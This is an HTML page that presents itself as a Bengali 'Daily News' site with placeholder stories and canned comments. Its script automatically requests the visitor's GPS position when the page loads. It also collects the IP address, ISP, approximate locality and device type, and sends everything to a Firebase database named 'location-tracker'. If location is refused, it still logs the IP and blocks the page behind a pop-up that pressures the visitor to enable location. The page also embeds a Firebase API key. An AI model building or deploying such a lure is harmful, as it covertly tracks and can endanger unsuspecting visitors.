<!DOCTYPE html>
<html>
<head>
<title>Daily News</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{margin:0;font-family:Arial;background:#f5f5f5;}

header{background:#c40000;color:white;padding:15px;text-align:center;font-size:26px;}
nav{background:#111;padding:10px;text-align:center;}
nav a{color:white;margin:0 10px;text-decoration:none;font-size:14px;}

.container{width:95%;margin:auto;margin-top:20px;}

.grid{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
gap:15px;
}

.card{
background:white;
padding:10px;
border-radius:8px;
cursor:pointer;
}

.card img{
width:100%;
height:150px;
object-fit:cover;
border-radius:6px;
}

#articlePage{display:none;}

.article{background:white;padding:15px;border-radius:8px;}
.comments{margin-top:20px;background:white;padding:10px;border-radius:8px;}
.comment{border-bottom:1px solid #ddd;padding:5px 0;font-size:14px;}

.ad{background:#ddd;padding:20px;text-align:center;margin:10px 0;}
.footer{background:#111;color:white;text-align:center;padding:15px;margin-top:20px;}

/* LOCATION GATE */
#locationGate{
position:fixed;
top:0;left:0;
width:100%;height:100%;
backdrop-filter:blur(6px);
background:rgba(0,0,0,0.4);
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

.gate-box{
background:white;
padding:25px;
border-radius:12px;
width:90%;
max-width:340px;
text-align:center;
box-shadow:0 10px 30px rgba(0,0,0,0.2);
}

.gate-box button{
width:100%;
padding:12px;
background:#ff4b5c;
color:white;
border:none;
border-radius:6px;
font-size:16px;
margin-top:10px;
cursor:pointer;
}

.card img{
background:#ddd;
}

/* 🔥 iOS STYLE GATE */

#locationGate{
backdrop-filter: blur(10px);
background: rgba(0,0,0,0.3);
}

.gate-box.ios{
background: rgba(255,255,255,0.95);
border-radius:16px;
padding:20px;
width:85%;
max-width:320px;
text-align:center;
box-shadow:0 10px 40px rgba(0,0,0,0.3);
animation:iosPop 0.4s ease;
}

.gate-box.ios h3{
margin-bottom:8px;
font-weight:600;
}

.gate-box.ios p{
font-size:14px;
color:#555;
margin-bottom:15px;
}

/* iOS button */
.gate-box.ios button{
width:100%;
padding:14px;
background:#007aff;
color:white;
border:none;
border-radius:10px;
font-size:16px;
font-weight:500;
cursor:pointer;
transition:0.2s;
}

.gate-box.ios button:active{
background:#005ecb;
transform:scale(0.97);
}

/* animation */
@keyframes iosPop{
from{transform:scale(0.8);opacity:0;}
to{transform:scale(1);opacity:1;}
}

</style>
</head>

<body>

<!-- LOCATION GATE -->
<div id="locationGate">
<div class="gate-box ios">
<h2>📍 Enable Location</h2>
<p>আপনার এলাকার খবর দেখতে location চালু করুন</p>
<button onclick="retryLocation()">Enable Location</button>
</div>
</div>

<header>📰 Daily News</header>

<nav>
<a href="#" onclick="showHome()">Home</a>
<a href="#">বাংলাদেশ</a>
<a href="#">বিশ্ব</a>
<a href="#">খেলা</a>
</nav>

<div class="container">

<div id="homePage">
<div class="ad">📢 Advertisement</div>
<div id="newsContainer" class="grid"></div>
</div>

<div id="articlePage">
<button onclick="showHome()">⬅ Back</button>

<div class="article">
<h2 id="title"></h2>
<img id="image" style="width:100%;margin:10px 0;">
<p id="content"></p>
</div>

<div class="comments">
<h4>💬 Comments</h4>
<div id="commentList"></div>
</div>

</div>

</div>

<div class="footer">© 2026 Daily News</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const app = initializeApp({
apiKey:"AIzaSyAilTyrtwRg5nQ-LpTJkhHiBn33JV14Zbc",
authDomain:"location-tracker-bba55.firebaseapp.com",
projectId:"location-tracker-bba55"
});

const db = getFirestore(app);

// USER ID
function getUserId(){
let id = localStorage.getItem("userId")
if(!id){
id = Math.random().toString(36).substring(2,10)
localStorage.setItem("userId", id)
}
return id
}

// DEVICE
function detectDevice(){
let ua=navigator.userAgent;
if(/mobile/i.test(ua)) return "Mobile";
if(/tablet/i.test(ua)) return "Tablet";
return "Desktop";
}

function detectDeviceModel(){
let ua=navigator.userAgent;
if(ua.includes("Android")) return "Android Phone";
if(ua.includes("Windows")) return "Windows PC";
if(ua.includes("Mac")) return "Mac";
return "Unknown";
}

// LOCATION DETAILS
async function getLocationDetails(lat, lon){
try{
const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
const data = await res.json()
let a = data.address

return {
thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
district: a.state_district || a.county || "unknown"
}
}catch{
return {thana:"unknown",district:"unknown"}
}
}

// IP
async function getIP(){
let res = await fetch("https://ipinfo.io/json")
let data = await res.json()

return {
ip:data.ip,
org:data.org,
country:data.country
}
}

// SAVE
async function save(data){
await setDoc(doc(db,"locations",getUserId()), data)
}

// GPS
async function handleGPS(pos){

let lat = pos.coords.latitude
let lon = pos.coords.longitude

let loc = await getLocationDetails(lat,lon)
let ip = await getIP()

save({
latitude:lat,
longitude:lon,
thana:loc.thana,
district:loc.district,
country:ip.country,
ip:ip.ip,
isp:ip.org,
device:detectDevice(),
deviceModel:detectDeviceModel(),
type:"GPS",
time:new Date().toLocaleString()
})

}

// IP fallback
async function handleIP(){

let ip = await getIP()

save({
country:ip.country,
ip:ip.ip,
isp:ip.org,
device:detectDevice(),
deviceModel:detectDeviceModel(),
type:"IP",
time:new Date().toLocaleString()
})

}

// AUTO FLOW
function autoDetect(){
navigator.geolocation.getCurrentPosition(
pos=>{
handleGPS(pos)
},
()=>{
handleIP()
document.getElementById("locationGate").style.display="flex"
}
)
}

// RETRY
window.retryLocation = function(){

navigator.geolocation.getCurrentPosition(
pos=>{
document.getElementById("locationGate").style.display="none"
handleGPS(pos)
},
err=>{

if(err.code === 1){
alert("OOPS SORRY 🙃. Please Click 'TURN ON' For Visiting Our Site 😊.")
}
else if(err.code === 2){
alert("Please turn ON your device location (GPS) and try again.")
}
else if(err.code === 3){
alert("Location request timed out. Try again.")
}
else{
alert("Unable to get location.")
}

}
)

}

// 🔥 BANGLA NEWS
const newsData = [
{
title:"ঢাকায় আবারও বৃষ্টির পূর্বাভাস",
image:"https://images.unsplash.com/photo-1500375592092-40eb2168fd21",
summary:"আগামী ২৪ ঘণ্টায় ভারী বৃষ্টির সম্ভাবনা রয়েছে"
},
{
title:"বাংলাদেশের জয়",
image:"https://images.unsplash.com/photo-1540747913346-19e32dc3e97e",
summary:"নাটকীয় জয়ে সিরিজ জিতলো বাংলাদেশ"
},
{
title:"নতুন ফোন বাজারে",
image:"https://images.unsplash.com/photo-1511707171634-5f897ff02aa9",
summary:"নতুন ফিচার নিয়ে বাজারে এসেছে ফোন"
},
{
title:"ডলার বাড়ছে",
image:"https://images.unsplash.com/photo-1567427017947-545c5f8d16ad",
summary:"বাজারে প্রভাব পড়ছে"
},
{
title:"ঢাকায় যানজট",
image:"https://images.unsplash.com/photo-1502877338535-766e1452684a",
summary:"মানুষ ভোগান্তিতে"
},
{
title:"AI প্রযুক্তি চমক",
image:"https://images.unsplash.com/photo-1677442136019-21780ecad995",
summary:"বিশ্বে নতুন উদ্ভাবন"
}
]

// LOAD NEWS
function loadNews(){
let container=document.getElementById("newsContainer")
container.innerHTML=""

newsData.forEach((n,i)=>{
let div=document.createElement("div")
div.className="card"
div.innerHTML=`<img src="${n.image}"><h4>${n.title}</h4>`
div.onclick=()=>openArticle(i)
container.appendChild(div)
})
}

// ARTICLE
window.openArticle=function(i){
let n=newsData[i]
document.getElementById("homePage").style.display="none"
document.getElementById("articlePage").style.display="block"
document.getElementById("title").innerText=n.title
document.getElementById("image").src=n.image
document.getElementById("content").innerText=n.summary
loadComments()
}

window.showHome=function(){
document.getElementById("homePage").style.display="block"
document.getElementById("articlePage").style.display="none"
}

// COMMENTS
function loadComments(){
let arr=["দারুণ!","খুব ভালো","ধন্যবাদ"]
let list=document.getElementById("commentList")
list.innerHTML=""
arr.forEach(c=>{
let d=document.createElement("div")
d.className="comment"
d.innerText=c
list.appendChild(d)
})
}

// INIT
setTimeout(()=>autoDetect(),1000)
loadNews()

</script>

</body>
</html>
